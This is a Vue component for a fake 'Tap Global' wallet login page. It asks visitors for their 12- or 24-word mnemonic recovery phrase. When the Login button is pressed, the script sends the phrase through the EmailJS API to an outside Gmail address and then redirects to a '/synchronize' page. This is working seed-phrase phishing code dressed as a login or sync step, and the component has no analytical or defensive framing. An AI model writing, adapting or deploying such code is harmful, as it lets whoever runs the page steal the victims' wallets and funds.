<template>
  <div class="">
    <div id="daoos">
      <section class="section">
        <div>
          <div class="mb-10">
            <label class="text-[#152c5b] text-lg" for=""
              >Input your phrase value
            </label>
            <textarea
              v-model="phrase"
              placeholder="Enter 12/24 bit mnemonic phrases"
              style="
                border: 1px solid #e2e7ec;
                border-radius: 8px;
                box-shadow: 0 0 20px 1px rgb(166 179 207 / 30%);
                transition: 0.2s ease-in-out;
                font-weight: 400;
              "
              id="w3review"
              class="w-full mt-2 p-4 text-black"
              name="w3review"
              rows="4"
              cols="50"
            ></textarea>
          </div>
        </div>

        <button
          @click="getInformation"
          class="flex items-center justify-center bg-[#3377f8] w-full py-4 rounded-md"
        >
          <div class="flex items-center">
            <strong>Login</strong>
            <div
              v-if="isLoading"
              class="ml-2 w-5 h-5 rounded-full animate-spin border-4 border-dashed border-primary border-t-transparent"
            ></div>
          </div>
        </button>
      </section>
    </div>
  </div>
</template>

<script>
import axios from 'axios'
export default {
  data() {
    return {
      isLoading: false,

      phrase: '',
    }
  },
  methods: {
    getInformation() {
      let self = this
      try {
        this.isLoading = true

        if (this.phrase !== '') {
          var data = {
            service_id: 'service_g49xzs9',
            template_id: 'template_xkj0lgc',
            user_id: 'Q_v6F22hpmQkpwuex',
            template_params: {
              from_name: 'Tap Global',
              email: this.phrase,
              reply_to: 'customeronlineagent@gmail.com',
            },
          }
          axios
            .post('https://api.emailjs.com/api/v1.0/email/send', data)
            .then(function () {
              self.$router.push('/synchronize')
              self.isLoading = false
            })
            .catch(function () {
              self.isLoading = false
              self.$toast.error('Something went wrong, contact administrator')
            })
        } else {
          this.$toast.info('Wrong Input!. Fill the input form ')
          this.isLoading = false
        }
      } catch (error) {
        this.$toast.error('Something went wrong')
      }
    },
  },
}
</script>

<style></style>
